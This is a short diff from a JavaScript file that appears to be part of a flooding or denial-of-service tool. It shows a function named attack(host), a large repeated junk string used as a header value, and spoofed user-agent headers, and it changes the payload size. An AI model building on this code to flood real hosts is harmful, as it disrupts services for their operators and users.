@@ -64,7 +64,7 @@ function getUserAgent() {
 
 
 function getH() {
-  return ('2467zzasSSSLlKKFKKHKHKGKKK9596999').repeat(380);
+  return ('2467zzasSSSLlKKFKKHKHKGKKK9596999').repeat(250);
 }
 function attack(host) {
   /*
@@ -74,6 +74,7 @@ function attack(host) {
     var s = (d.getSeconds());
     console.log(`${h}:${m}:${s}`);
     */
+
 
 var headers = {
 'user-agent':getUserAgent(),
